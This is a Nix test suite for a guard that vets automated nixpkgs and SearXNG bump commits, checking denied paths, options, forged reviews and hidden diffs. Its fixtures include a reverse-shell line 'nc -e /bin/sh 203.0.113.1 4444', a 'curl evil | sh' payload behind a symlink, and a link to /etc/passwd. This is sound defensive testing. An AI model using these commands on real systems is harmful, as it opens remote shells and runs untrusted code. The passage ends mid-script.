# ./guard.sh against a scratch repository, without network: `curl` and
# `nix` are stubs (built into the guard tested here in place of the real
# ones) that answer GitHub's compare and `nix flake prefetch` from files
# under $STUB. Each case starts from main@origin, makes one change, and
# expects the guard to pass or to fail. Cases run online (against the
# stubs; a pass is exit 0 and a last line PASS) or with --offline (a pass
# there is exit 3 and a last line PASS-OFFLINE, never PASS).
{ pkgs, hermesVenv }:
let
  # GitHub's compare API: $STUB/compare/<base>...<head> holds the status;
  # none means unreachable (curl -f fails).
  curl = pkgs.writeShellApplication {
    name = "curl";
    runtimeInputs = [ pkgs.coreutils ];
    text = ''
      url=''${*: -1}
      case "$url" in
        https://api.github.com/repos/NixOS/nixpkgs/compare/*)
          spec=''${url#https://api.github.com/repos/NixOS/nixpkgs/compare/}
          spec=''${spec%%\?*}
          [ -r "$STUB/compare/$spec" ] || { echo "curl stub: unreachable $spec" >&2; exit 7; }
          printf '{"status": "%s"}\n' "$(cat "$STUB/compare/$spec")"
          ;;
        https://api.github.com/repos/searxng/searxng/compare/*)
          spec=''${url#https://api.github.com/repos/searxng/searxng/compare/}
          spec=''${spec%%\?*}
          [ -r "$STUB/sxcompare/$spec" ] || { echo "curl stub: unreachable $spec" >&2; exit 7; }
          printf '{"status": "%s"}\n' "$(cat "$STUB/sxcompare/$spec")"
          ;;
        *) echo "curl stub: unexpected $*" >&2; exit 2 ;;
      esac
    '';
  };
  # `nix flake prefetch --json github:NixOS/nixpkgs/<rev>` (and
  # github:searxng/searxng/<rev>): $STUB/prefetch/<rev>.
  nix = pkgs.writeShellApplication {
    name = "nix";
    runtimeInputs = [ pkgs.coreutils ];
    text = ''
      if [ "$#" = 4 ] && [ "$1 $2 $3" = "flake prefetch --json" ]; then
        rev=''${4#github:NixOS/nixpkgs/}
        rev=''${rev#github:searxng/searxng/}
        [ -r "$STUB/prefetch/$rev" ] || { echo "nix stub: cannot fetch $4" >&2; exit 1; }
        cat "$STUB/prefetch/$rev"
        exit 0
      fi
      echo "nix stub: unexpected $*" >&2
      exit 2
    '';
  };
  # the review's diff (nixpkgs-bump-searxng pick), tested at the end
  searxngDiff = import ./searxng-diff.nix { inherit pkgs hermesVenv; };
  guard = import ./guard.nix {
    inherit pkgs nix curl;
    logDir = "/build/log";
  };
in
pkgs.runCommand "nixpkgs-bump-guard-test"
  {
    nativeBuildInputs = [
      guard
      searxngDiff
      pkgs.git
      pkgs.jujutsu
      pkgs.jq
      pkgs.python3
    ];
  }
  ''
    set -euo pipefail
    export HOME=$TMPDIR/home JJ_USER=test JJ_EMAIL=test@example.org
    export STUB=$TMPDIR/stub
    mkdir -p $HOME
    git config --global user.name test
    git config --global user.email test@example.org
    git config --global init.defaultBranch main

    old=1111111111111111111111111111111111111111
    new=2222222222222222222222222222222222222222
    hash="sha256-$(printf 'A%.0s' {1..43})="
    sxold=5555555555555555555555555555555555555555
    sxnew=6666666666666666666666666666666666666666
    lock() { # rev lastModified ref [searxng rev, lastModified]
      jq -n --arg rev "$1" --argjson mod "$2" --arg ref "$3" --arg hash "$hash" \
        --arg sxrev "''${4:-$sxold}" --argjson sxmod "''${5:-100}" '{
        nodes: {
          root: {inputs: {nixpkgs: "nixpkgs_4", disko: "disko", searxng: "searxng"}},
          searxng: {flake: false,
            locked: {lastModified: $sxmod, narHash: $hash,
              owner: "searxng", repo: "searxng", rev: $sxrev, type: "github"},
            original: {owner: "searxng", repo: "searxng", type: "github"}},
          nixpkgs_4: {
            locked: {lastModified: $mod, narHash: $hash,
              owner: "NixOS", repo: "nixpkgs", rev: $rev, type: "github"},
            original: {owner: "NixOS", ref: $ref, repo: "nixpkgs", type: "github"}},
          disko: {
            locked: {lastModified: 1, narHash: "sha256-\("B" * 43)=",
              owner: "nix-community", repo: "disko", rev: "\("3" * 40)", type: "github"},
            original: {owner: "nix-community", repo: "disko", type: "github"}}},
        root: "root", version: 7}'
    }
    # the network as it should be: $new is nixpkgs-unstable's tip, ahead
    # of $old, and prefetches to the lock's narHash
    stub_good() {
      rm -rf "$STUB"
      mkdir -p "$STUB/compare" "$STUB/prefetch"
      echo identical >"$STUB/compare/$new...nixpkgs-unstable"
      echo ahead >"$STUB/compare/$old...$new"
      jq -n --arg hash "$hash" '{hash: $hash, locked: {lastModified: 200}}' >"$STUB/prefetch/$new"
      mkdir -p "$STUB/sxcompare"
      echo identical >"$STUB/sxcompare/$sxnew...master"
      echo ahead >"$STUB/sxcompare/$sxold...$sxnew"
      jq -n --arg hash "$hash" '{hash: $hash, locked: {lastModified: 300}}' >"$STUB/prefetch/$sxnew"
    }
    mkdir -p /build/log
    L=/build/log/hyperconfig-nixpkgs-bump-2026-01-01
    # master's tips as nixpkgs-bump-searxng pick records them: <rev> first
    # seen <age> seconds ago
    tips() { # rev age [rev age ...]
      : >/build/log/searxng-tips.jsonl
      while [ $# -gt 0 ]; do
        jq -cn --arg t "$1" --argjson e "$(($(date +%s) - $2))" '{date: "x", epoch: $e, tip: $t}' \
          >>/build/log/searxng-tips.jsonl
        shift 2
      done
    }
    days4=$((4 * 86400))
    # what nixpkgs-bump-searxng pick, review approve and canary write on
    # the way to a PASS, for old..new
    pick_ok() {
      echo "# the diff of $1..$2" >"$L.searxng-diff"
      rm -f "$L".searxng-diff.part-*
      echo "# the diff of" >"$L.searxng-diff.part-01"
      echo "$1..$2" >"$L.searxng-diff.part-02"
      echo "$1 $2 $(sha256sum <"$L.searxng-diff" | cut -c1-64) 2 $(parts_sum "$L.searxng-diff")" >"$L.searxng-pick"
    }
    # nixpkgs-bump-searxng's parts hash: the count, then `<i> <bytes>
    # <sha256>` per part
    parts_sum() {
      local i n p
      n=$(find "$(dirname "$1")" -maxdepth 1 -name "$(basename "$1").part-*" | wc -l)
      {
        echo "$n"
        for i in $(seq 1 "$n"); do
          p=$(printf '%s.part-%02d' "$1" "$i")
          echo "$i $(wc -c <"$p") $(sha256sum <"$p" | cut -c1-64)"
        done
      } | sha256sum | cut -c1-64
    }
    review_ok() { echo "approve searxng=$1..$2 diff=$(cut -d' ' -f3 "$L.searxng-pick")" >"$L.searxng-review"; }
    canary_pass() {
      echo "PASS searxng=$1 nixpkgs=$2" >"$L.searxng-canary"
      tips "$1" $days4
      pick_ok $sxold "$1"
      review_ok $sxold "$1"
    }
    stub_good

    git init -q --bare origin.git
    git init -q seed
    (
      cd seed
      lock $old 100 nixpkgs-unstable >flake.lock
      mkdir -p vars/shared machines/x modules/nixos/infra-space
      echo secret >vars/shared/value
      printf '{ pkgs, ... }:\n{\n  services.foo.enable = true;\n  services.foo.extraConfig = "x = 1";\n}\n' >machines/x/default.nix
      echo '{ }' >modules/nixos/infra-space/default.nix
      # root on every machine (nixosConfigurations.nix), and a machine
      # whose multi-line lists take a new item without naming an option
      printf '{\n  dave = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIdave";\n}\n' >modules/admin-ssh-keys.nix
      mkdir -p machines/y modules/nixos/luks
      printf '%s\n' '{ ... }:' '{' \
        '  users.users.root.openssh.authorizedKeys.keys = [' \
        '    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIold"' \
        '  ];' \
        '  networking.firewall.allowedTCPPorts = [' \
        '    80' \
        '  ];' \
        '}' >machines/y/default.nix
      printf '#!/bin/sh\necho unlock\n' >modules/nixos/luks/agent.sh
      # every machine's copy of the secrets store, pulled from this URL
      printf '%s\n' '{ lib, ... }:' '{' \
        '  options.clanSecretsMirror.url = lib.mkOption {' \
        '    default = "git@github.com:DavHau/hyperconfig-secrets.git";' \
        '  };' \
        '}' >modules/nixos/clan-secrets-mirror.nix
      git add -A
      git commit -qm init
      git push -q ../origin.git main
    )
    ws=$PWD/hyperconfig-nixpkgs-bump-2026-01-01
    jj git clone --colocate origin.git "$ws" >/dev/null 2>&1
    echo $old >start.rev
    cd "$ws"

    mode=offline
    guard() {
      if [ "$mode" = offline ]; then
        nixpkgs-bump-guard --offline --old-rev-file "$TMPDIR/start.rev"
      else
        nixpkgs-bump-guard --old-rev-file "$TMPDIR/start.rev"
      fi
    }
    run() { # expect(pass|fail) description why(the FAIL line's pattern) edit
      local expect=$1 what=$2 why=$3 rc=0 last want_rc=0 want_last="nixpkgs-bump-guard: PASS"
      shift 3
      jj new main@origin >/dev/null 2>&1
      "$@"
      jj describe -m "$what" >/dev/null 2>&1
      guard >"$TMPDIR/out" 2>&1 || rc=$?
      last=$(tail -n 1 "$TMPDIR/out")
      if [ "$mode" = offline ]; then
        want_rc=3 want_last="nixpkgs-bump-guard: PASS-OFFLINE (not a push permit)"
      fi
      if [ "$rc" = "$want_rc" ] && [ "$last" = "$want_last" ]; then
        got=pass
      elif [ "$rc" = 1 ] && ! grep -q 'PASS' "$TMPDIR/out"; then
        got=fail
      else
        got="exit $rc, last line '$last'"
      fi
      if [ "$got" != "$expect" ] || { [ "$got" = fail ] && ! grep -q "FAIL: .*$why" "$TMPDIR/out"; }; then
        cat "$TMPDIR/out"
        echo "FAILED: $what ($mode): expected $expect ($why), got $got"
        exit 1
      fi
      echo "ok: $what ($mode, $got)"
    }

    bump() { lock $new 200 nixpkgs-unstable >flake.lock; }
    lock_with() { lock $new 200 nixpkgs-unstable | jq "$1" >flake.lock; }
    fix() { bump; printf '%s\n' "$@" >machines/x/fix.nix; }
    # a renamed option adapted (extraConfig -> settings): nothing denied
    machine_fix() {
      bump
      printf '{ pkgs, ... }:\n{\n  services.foo.enable = true;\n  services.foo.settings.x = 1;\n}\n' >machines/x/default.nix
    }
    secret() { bump; echo y >vars/shared/value; }
    own_module() { bump; echo '{ x = 1; }' >modules/nixos/infra-space/default.nix; }
    flake_nix() { bump; echo '{ }' >flake.nix; }
    substituter() { fix '{ nix.settings.substituters = [ "https://x" ]; }'; }
    authorized_key() { fix '{ users.users.root.openssh.authorizedKeys.keys = [ "k" ]; }'; }
    fetch() { fix '{ p = fetchpatch { url = "https://x"; }; }'; }
    other_input() { lock_with '.nodes.disko.locked.rev = "4444444444444444444444444444444444444444"'; }
    new_node() { lock_with '.nodes.evil = {}'; }
    other_branch() { lock $new 200 nixos-unstable-small >flake.lock; }
    other_owner() { lock_with '.nodes.nixpkgs_4.locked.owner = "evil"'; }
    backwards() { lock $new 50 nixpkgs-unstable >flake.lock; }
    # F1: diffs that git would show as binary or through a driver
    attributes_in_tree() {
      fix '{ security.sudo.wheelNeedsPassword = false; }'
      printf '*.nix -diff\nfix.nix binary\n' >.gitattributes
    }
    attributes_in_repo() {
      fix '{ security.sudo.wheelNeedsPassword = false; }'
      mkdir -p .git/info
      echo '*.nix diff=hide' >.git/info/attributes
      git config diff.hide.textconv 'sed d'
      git config diff.hide.command true
      git config diff.external true
    }
    attributes_cleanup() {
      rm -f .git/info/attributes
      git config --unset diff.hide.textconv
      git config --unset diff.hide.command
      git config --unset diff.external
    }
    # F2: names git would quote, symlinks
    quoted_secret() { bump; printf 's\n' >"vars/shared/é"; }
    upper_secret() { bump; mkdir -p Vars; echo s >Vars/x; }
    tab_name() { bump; echo '{ }' >"machines/x/a$(printf '\t')b.nix"; }
    symlink() { bump; ln -s ../../vars/shared/value machines/x/value; }
    # F3: nested attribute sets, units, fetches the old list missed
    nested_users() { fix '{' '  users = {' '    users.eve.isNormalUser = true;' '  };' '}'; }
    nested_vars() { fix '{' '  clan.core = {' '    vars.generators.x = { };' '  };' '}'; }
    exec_start() { fix '{' '  systemd.services.x.serviceConfig.ExecStart = "/bin/sh";' '}'; }
    unit_script() { fix '{ x.script = "id"; }'; }
    firewall() { fix '{ networking.firewall.enable = false; }'; }
    known_hosts() { fix '{ programs.ssh.knownHosts.x.publicKey = "k"; }'; }
    require_file() { fix '{ p = requireFile { name = "x"; sha256 = ""; }; }'; }
    output_hash() { fix '{ p = pkgs.runCommand "x" { outputHash = ""; } "true"; }'; }
    dynamic_builtin() { fix '{ p = builtins.''${"fe" + "tchurl"} "x"; }'; }
    url() { fix '{ p = pkgs.foo.override { src = "http://example.org/x"; }; }'; }
    allow_env() { fix '# NIXPKGS_ALLOW_INSECURE=1'; }
    envrc() { bump; echo 'use flake' >.envrc; }
    flake_parts() { bump; mkdir -p modules/flake-parts; echo '{ }' >modules/flake-parts/x.nix; }
    nested_lock() { bump; mkdir -p tools/x; echo '{ }' >machines/x/flake.lock; }
    fake_header() { fix '{' '++ b/machines/x/fix.nix' '-- a/security' '}'; }
    # third review: admin keys, items in multi-line lists, non-Nix files,
    # attribute names computed from strings
    admin_key() {
      bump
      printf '{\n  dave = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIdave";\n  x = "k";\n}\n' >modules/admin-ssh-keys.nix
    }
    list_key() {
      bump
      sed -i 's/^    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIold"$/&\n    "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTY="/' machines/y/default.nix
    }
    list_port() { bump; sed -i 's/^    80$/&\n    2222/' machines/y/default.nix; }
    root_script() { bump; echo 'nc -e /bin/sh 203.0.113.1 4444' >>modules/nixos/luks/agent.sh; }
    json_file() { bump; echo '{ "x": 1 }' >machines/x/data.json; }
    # fourth review: the secrets mirror's URL names no denied option
    mirror_url() { bump; sed -i 's|DavHau/hyperconfig-secrets|eve/x|' modules/nixos/clan-secrets-mirror.nix; }
    dynamic_attr() { fix '{ ''${"user" + "s"}.''${"user"+"s"}.eve.isNormalUser = true; }'; }
    # searxng (web_search's SearXNG) moves with the bump, canary-gated
    sx_bump() { lock $new 200 nixpkgs-unstable $sxnew 300 >flake.lock; canary_pass $sxnew $new; }
    sx_only() { lock $old 100 nixpkgs-unstable $sxnew 300 >flake.lock; canary_pass $sxnew $old; }
    sx_no_canary() { sx_bump; rm -f /build/log/*.searxng-canary; }
    sx_stale_canary() { lock $new 200 nixpkgs-unstable $sxnew 300 >flake.lock; canary_pass $sxold $new; }
    sx_canary_other_nixpkgs() { lock $new 200 nixpkgs-unstable $sxnew 300 >flake.lock; canary_pass $sxnew $old; }
    sx_fork() { sx_bump; jq '.nodes.searxng.locked.owner = "evil" | .nodes.searxng.original.owner = "evil"' flake.lock >l && mv l flake.lock; }
    sx_backwards() { lock $new 200 nixpkgs-unstable $sxnew 50 >flake.lock; canary_pass $sxnew $new; }
    sx_no_review() { sx_bump; rm -f /build/log/*.searxng-review; }
    sx_review_other() { sx_bump; review_ok $sxold 7777777777777777777777777777777777777777; }
    sx_review_reject() { sx_bump; echo "reject searxng=$sxold..$sxnew diff=$(cut -d' ' -f3 "$L.searxng-pick")" >"$L.searxng-review"; }
    # the review approved another diff than the pick's
    sx_review_other_diff() { sx_bump; echo "approve searxng=$sxold..$sxnew diff=$(printf 'b%.0s' {1..64})" >"$L.searxng-review"; }
    # the diff file was rewritten after the pick (and the review)
    sx_diff_changed() { sx_bump; echo "# something else" >"$L.searxng-diff"; }
    # a part the review reads was edited after the pick (the diff file not)
    sx_part_edited() { sx_bump; echo 'import os; os.system("evil")' >>"$L.searxng-diff.part-02"; }
    # a part removed, or a stray one added, after the pick
    sx_part_removed() { sx_bump; rm "$L.searxng-diff.part-02"; }
    sx_part_added() { sx_bump; echo x >"$L.searxng-diff.part-03"; }
    # the same bytes split elsewhere (the concatenation unchanged): the
    # review read other parts
    sx_part_resplit() { sx_bump; printf '# the diff of\n%s..' $sxold >"$L.searxng-diff.part-01"; echo $sxnew >"$L.searxng-diff.part-02"; }
    # a pick file of the old format (no parts' hash)
    sx_pick_no_parts() { sx_bump; cut -d' ' -f1-3 "$L.searxng-pick" >p && mv p "$L.searxng-pick"; }
    sx_no_pick() { sx_bump; rm -f "$L.searxng-pick"; }
    sx_pick_other() { sx_bump; sed -i "s/^$sxold $sxnew /$sxold 7777777777777777777777777777777777777777 /" "$L.searxng-pick"; }
    # age by our own record of master's tips, never the commit date: a
    # commit dated long ago but first seen just now is young
    sx_young() { sx_bump; tips $sxnew 3600; }
    sx_unseen() { sx_bump; tips 8888888888888888888888888888888888888888 $days4; }
    sx_no_tips() { sx_bump; rm -f /build/log/searxng-tips.jsonl; }
    # seen young once, but also 4 days ago: the first sighting counts
    sx_seen_twice() { sx_bump; tips $sxnew 3600 $sxnew $days4; }
    # not a recorded tip, but behind one recorded 4 days ago (online only)
    sxtip=9999999999999999999999999999999999999999
    sx_behind_tip() { sx_bump; tips $sxtip $days4; }
    sx_flake() { sx_bump; jq '.nodes.searxng.flake = true' flake.lock >l && mv l flake.lock; }
    interpolated_attr() { fix '{ "''${"secur"}ity"."''${"su"}do".wheelNeedsPassword = false; }'; }

    run pass "the bump alone" "" bump
    run pass "the bump and a fix to a machine (a renamed option)" "" machine_fix
    run fail "nothing changed" "empty or undescribed" true
    run fail "a secret too" "denied paths" secret
    run fail "the agent's own module" "denied paths" own_module
    run fail "flake.nix" "denied paths" flake_nix
    run fail "a substituter" "denied options" substituter
    run fail "an authorized key" "denied options" authorized_key
    run fail "a new fetch" "denied options" fetch
    run fail "another input moved" "more than nixpkgs" other_input
    run fail "a new node" "more than nixpkgs" new_node
    run fail "another branch" "original is not" other_branch
    run fail "another owner" "not a plain" other_owner
    run fail "lastModified backwards" "backwards" backwards
    run fail "in-tree .gitattributes -diff hides a denied option" "denied options" attributes_in_tree
    run fail "in-tree .gitattributes itself" "denied paths" attributes_in_tree
    run fail "repo attributes, textconv, diff.external hide a denied option" "denied options" attributes_in_repo
    attributes_cleanup
    run fail "a non-ASCII name under vars/" "denied paths" quoted_secret
    run fail "Vars/ in another case" "denied paths" upper_secret
    run fail "a tab in a name" "odd name" tab_name
    run fail "a symlink" "symlink" symlink
    run fail "users in a nested attribute set" "denied options" nested_users
    run fail "clan vars in a nested attribute set" "denied options" nested_vars
    run fail "a systemd ExecStart" "denied options" exec_start
    run fail "a unit script" "denied options" unit_script
    run fail "the firewall" "denied options" firewall
    run fail "ssh known hosts" "denied options" known_hosts
    run fail "requireFile" "denied options" require_file
    run fail "a fixed-output derivation" "denied options" output_hash
    run fail "a computed builtins attribute" "denied options" dynamic_builtin
    run fail "a URL" "denied options" url
    run fail "NIXPKGS_ALLOW_*" "denied options" allow_env
    run fail ".envrc" "denied paths" envrc
    run fail "modules/flake-parts/" "denied paths" flake_parts
    run fail "a nested flake.lock" "denied paths" nested_lock
    run fail "content that looks like a diff header" "denied options" fake_header
    run fail "modules/admin-ssh-keys.nix" "denied paths" admin_key
    run fail "an ecdsa key in a multi-line authorizedKeys list" "denied options" list_key
    run fail "a port in a multi-line allowedTCPPorts list" "denied options" list_port
    run fail "a root-run shell script" "only .nix files" root_script
    run fail "a JSON file" "only .nix files" json_file
    run fail "a dynamic attribute name" "denied options" dynamic_attr
    run fail "an interpolated attribute name" "denied options" interpolated_attr
    run fail "the secrets mirror's repository URL" "denied paths" mirror_url
    run pass "nixpkgs and searxng, canary passed" "" sx_bump
    run pass "searxng alone, canary passed" "" sx_only
    run fail "searxng without a canary verdict" "without a passed canary" sx_no_canary
    run fail "searxng, the canary passed another searxng" "without a passed canary" sx_stale_canary
    run fail "searxng, the canary passed with another nixpkgs" "without a passed canary" sx_canary_other_nixpkgs
    run fail "searxng from a fork" "original is not github:searxng" sx_fork
    run fail "searxng lastModified backwards" "searxng's lastModified went backwards" sx_backwards
    run fail "searxng as a flake" "original is not github:searxng" sx_flake
    run fail "searxng without a code review" "without an approved code review" sx_no_review
    run fail "searxng, the review approved another pair" "without an approved code review" sx_review_other
    run fail "searxng, the review rejected it" "without an approved code review" sx_review_reject
    run fail "searxng, the review approved another diff" "without an approved code review" sx_review_other_diff
    run fail "searxng, the diff changed after the pick" "the reviewed diff changed since the pick" sx_diff_changed
    run fail "searxng, a part edited after the pick" "the reviewed diff's parts changed since the pick" sx_part_edited
    run fail "searxng, a part removed after the pick" "the reviewed diff's parts changed since the pick" sx_part_removed
    run fail "searxng, a part added after the pick" "the reviewed diff's parts changed since the pick" sx_part_added
    run fail "searxng, the same bytes split into other parts" "the reviewed diff's parts changed since the pick" sx_part_resplit
    run fail "searxng, a pick without the parts' hash" "without a pick of" sx_pick_no_parts
    run fail "searxng without a pick" "without a pick of" sx_no_pick
    run fail "searxng, the pick was another pair" "without a pick of" sx_pick_other
    run fail "searxng first seen under 72 h ago" "not a master tip first seen at least 72 h ago" sx_young
    run fail "searxng never seen as master's tip" "not a master tip first seen at least 72 h ago" sx_unseen
    run fail "searxng without a tips record" "not a master tip first seen at least 72 h ago" sx_no_tips
    run pass "searxng first seen 4 days ago, again since" "" sx_seen_twice
    run fail "searxng behind an aged tip, offline" "not a master tip first seen at least 72 h ago" sx_behind_tip

    # someone else bumped since the run started
    echo 9999999999999999999999999999999999999999 >"$TMPDIR/start.rev"
    run fail "main@origin moved nixpkgs since the start" "someone else bumped" bump
    echo $old >"$TMPDIR/start.rev"

    # (ii) against the stubs: GitHub's compare and the prefetch
    mode=online
    run pass "the bump, the tip of nixpkgs-unstable" "" bump
    echo ahead >"$STUB/compare/$new...nixpkgs-unstable"
    run pass "the bump, behind the tip (the channel moved on)" "" bump
    run pass "a fix, online" "" machine_fix
    echo diverged >"$STUB/compare/$new...nixpkgs-unstable"
    run fail "a rev off nixpkgs-unstable (a fork's)" "not on nixpkgs-unstable (compare: diverged)" bump
    echo behind >"$STUB/compare/$new...nixpkgs-unstable"
    run fail "a rev past nixpkgs-unstable" "not on nixpkgs-unstable (compare: behind)" bump
    rm "$STUB/compare/$new...nixpkgs-unstable"
    run fail "GitHub unreachable" "not on nixpkgs-unstable (compare: unreachable)" bump
    stub_good
    echo diverged >"$STUB/compare/$old...$new"
    run fail "a rev that does not descend from the old one" "does not descend" bump
    stub_good
    jq '.hash = "sha256-\("C" * 43)="' "$STUB/prefetch/$new" >"$TMPDIR/p" && mv "$TMPDIR/p" "$STUB/prefetch/$new"
    run fail "a narHash that is not the prefetched one" "narHash is not the prefetched" bump
    stub_good
    jq '.locked.lastModified = 300' "$STUB/prefetch/$new" >"$TMPDIR/p" && mv "$TMPDIR/p" "$STUB/prefetch/$new"
    run fail "a lastModified that is not the prefetched one" "lastModified is not the prefetched" bump
    rm "$STUB/prefetch/$new"
    run fail "the prefetch fails" "prefetch .* failed" bump
    stub_good
    run fail "denied paths online too" "denied paths" secret
    run pass "nixpkgs and searxng, online" "" sx_bump
    run pass "searxng alone, online" "" sx_only
    echo ahead >"$STUB/sxcompare/$sxnew...$sxtip"
    run pass "searxng behind a tip first seen 4 days ago, online" "" sx_behind_tip
    echo diverged >"$STUB/sxcompare/$sxnew...$sxtip"
    run fail "searxng beside an aged tip, online" "not a master tip first seen at least 72 h ago" sx_behind_tip
    stub_good
    run fail "searxng first seen under 72 h ago, online" "not a master tip first seen at least 72 h ago" sx_young
    echo diverged >"$STUB/sxcompare/$sxnew...master"
    run fail "a searxng rev off master" "not on searxng's master (compare: diverged)" sx_bump
    stub_good
    echo diverged >"$STUB/sxcompare/$sxold...$sxnew"
    run fail "a searxng rev that does not descend" "searxng .* does not descend" sx_bump
    stub_good
    jq '.hash = "sha256-\("C" * 43)="' "$STUB/prefetch/$sxnew" >"$TMPDIR/p" && mv "$TMPDIR/p" "$STUB/prefetch/$sxnew"
    run fail "a searxng narHash that is not the prefetched one" "searxng's narHash is not the prefetched" sx_bump
    stub_good
    mode=offline

    # not the bump workspace
    jj new main@origin >/dev/null 2>&1
    lock $new 200 nixpkgs-unstable >flake.lock
    jj describe -m bump >/dev/null 2>&1
    mkdir sub
    if (cd sub && nixpkgs-bump-guard --offline --old-rev-file "$TMPDIR/start.rev") >/dev/null 2>&1; then
      echo "FAILED: ran from a subdirectory"
      exit 1
    fi
    echo "ok: refuses a subdirectory"
    rmdir sub
    cp -r "$ws" "$TMPDIR/hyperconfig"
    if (cd "$TMPDIR/hyperconfig" && nixpkgs-bump-guard --offline --old-rev-file "$TMPDIR/start.rev") >/dev/null 2>&1; then
      echo "FAILED: ran in a checkout that is not a bump workspace"
      exit 1
    fi
    echo "ok: refuses the main checkout"
    # an empty working-copy commit on top of the bump
    jj new >/dev/null 2>&1
    if nixpkgs-bump-guard --offline --old-rev-file "$TMPDIR/start.rev" >"$TMPDIR/out" 2>&1 ||
      ! grep -q "FAIL: .*empty or undescribed" "$TMPDIR/out"; then
      cat "$TMPDIR/out"
      echo "FAILED: pushed an empty commit"
      exit 1
    fi
    echo "ok: refuses an empty commit on top"

    # nixpkgs-bump-searxng-diff: nothing in the sources hides a file from
    # the review or the size cap (the reviewer's repro: the new tree's
    # own .gitignore names the new code, .gitattributes marks it -diff)
    sd=$TMPDIR/sxdiff
    mkdir -p "$sd/a/searx/translations/de" "$sd/b/local" "$sd/b/searx/engines" "$sd/b/searx/translations/de" "$sd/b/searx/data"
    echo x >"$sd/a/f.py"
    echo x >"$sd/b/f.py"
    printf 'local/\nsearx/engines/hidden.py\n' >"$sd/b/.gitignore"
    printf '*.py -diff\n*.py binary\n' >"$sd/b/.gitattributes"
    echo 'import os; os.system("evil")' >"$sd/b/local/evil.py"
    echo 'evil2' >"$sd/b/searx/engines/hidden.py"
    # code under the translations directory still counts; .po/.mo do not
    echo 'evil3' >"$sd/b/searx/translations/hook.py"
    echo 'msgid "a"' >"$sd/a/searx/translations/de/messages.po"
    echo 'msgid "b"' >"$sd/b/searx/translations/de/messages.po"
    echo '{"a": 1}' >"$sd/b/searx/data/engine.json"
    ln -s /etc/passwd "$sd/b/link"
    rc=0
    nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || rc=$?
    read -r lines bytes <"$sd/res"
    for want in 'evil.py' 'os.system("evil")' 'hidden.py' '+evil2' 'translations/hook.py' '+evil3' \
      '+local/' '+*.py -diff' 'new file mode 120000' '+/etc/passwd'; do
      if ! grep -qF -- "$want" "$sd/out"; then
        cat "$sd/out"
        echo "FAILED: the searxng diff hides '$want'"
        exit 1
      fi
    done
    code=$(sed -n '/^# --- the code diff /,/^# --- end of the code diff$/p' "$sd/out")
    if grep -qF 'messages.po' <<<"$code" || grep -qF 'engine.json' <<<"$code"; then
      cat "$sd/out"
      echo "FAILED: translations or data counted as code"
      exit 1
    fi
    # the uncounted files' content is shown too, after the code
    gen=$(sed -n '/^# --- the searx\/data diff /,$p' "$sd/out")
    grep -qF '+msgid "b"' <<<"$gen" && grep -qF '+{"a": 1}' <<<"$gen" || {
      cat "$sd/out"
      echo "FAILED: the uncounted files' diff is not shown"
      exit 1
    }
    [ "$lines" = "$(($(wc -l <<<"$code") - 2))" ] || {
      echo "FAILED: counted $lines code lines, the code diff has $(($(wc -l <<<"$code") - 2))"
      exit 1
    }
    [ "$bytes" -gt 0 ] || { echo "FAILED: no byte count"; exit 1; }
    # a symlink out of the tree: held back (the review cannot see its target)
    [ "$rc" = 3 ] && grep -qx 'HOLD symlink link -> /etc/passwd: points outside the tree' "$sd/res" || {
      cat "$sd/res"
      echo "FAILED: a symlink out of the tree was not held back (exit $rc)"
      exit 1
    }
    echo "ok: the searxng diff shows ignored, -diff and translations-dir code ($lines lines) and the uncounted diff; holds a symlink out of the tree"

    # the reviewer's repro: counted code that is a symlink to an uncounted
    # file holding Python (searx/engines/b.py -> ../data/payload.json), a
    # symlinked directory with uncounted files, a dangling outside one
    sd=$TMPDIR/sxlink
    mkdir -p "$sd/a/searx/engines" "$sd/b/searx/engines" "$sd/b/searx/data/sub"
    echo 'x = 1' >"$sd/a/searx/engines/a.py"
    echo 'x = 2' >"$sd/b/searx/engines/a.py"
    echo 'import os; os.system("curl evil | sh")' >"$sd/b/searx/data/payload.json"
    echo '{}' >"$sd/b/searx/data/sub/t.json"
    ln -s ../data/payload.json "$sd/b/searx/engines/b.py"
    ln -s data "$sd/b/searx/d2"
    ln -s ../../../../outside/x.py "$sd/b/searx/engines/c.py"
    # a symlink to counted code is fine
    ln -s a.py "$sd/b/searx/engines/ok.py"
    rc=0
    nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || rc=$?
    for want in 'HOLD symlink searx/engines/b.py -> ../data/payload.json: points into the uncounted searx/data/payload.json' \
      'HOLD symlink searx/d2 -> data: a directory holding uncounted files' \
      'HOLD symlink searx/engines/c.py -> ../../../../outside/x.py: points outside the tree'; do
      grep -qF -- "$want" "$sd/res" || {
        cat "$sd/res"
        echo "FAILED: not held back: $want"
        exit 1
      }
    done
    if [ "$rc" != 3 ] || grep -qF 'ok.py' "$sd/res"; then
      cat "$sd/res"
      echo "FAILED: the symlink holds (exit $rc, want 3; ok.py is fine)"
      exit 1
    fi
    grep -qF '# HELD BACK' "$sd/out" || { echo "FAILED: the review file does not say it is held back"; exit 1; }
    rm "$sd/b/searx/engines/b.py" "$sd/b/searx/d2" "$sd/b/searx/engines/c.py"
    nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || {
      cat "$sd/res"
      echo "FAILED: a symlink to counted code held back"
      exit 1
    }
    echo "ok: holds symlinks into uncounted files, to directories of them and out of the tree"

    # every part of OUT one file-tool read: <= 90000 bytes with ~9 per
    # line for the line number, <= 1800 lines, no line over 2000
    # characters (that tool cuts longer ones), in order, and together
    # the file once the folds are undone
    parts_ok() { # out
      local n=0 p
      for p in "$1".part-*; do
        n=$((n + 1))
        [ "$p" = "$(printf '%s.part-%02d' "$1" "$n")" ] || { echo "FAILED: part $p out of order"; exit 1; }
        [ "$(LC_ALL=C awk '{ b += length($0) + 9 } END { print b + 0 }' "$p")" -le 90000 ] &&
          [ "$(wc -l <"$p")" -le 1800 ] &&
          [ "$(LC_ALL=C awk '{ if (length($0) > m) m = length($0) } END { print m + 0 }' "$p")" -le 2000 ] || {
          echo "FAILED: $p too big: $(wc -lcL <"$p")"
          exit 1
        }
      done
      cat "$1".part-* | LC_ALL=C awk '
        /^\\~ / { cur = cur substr($0, 4); next }
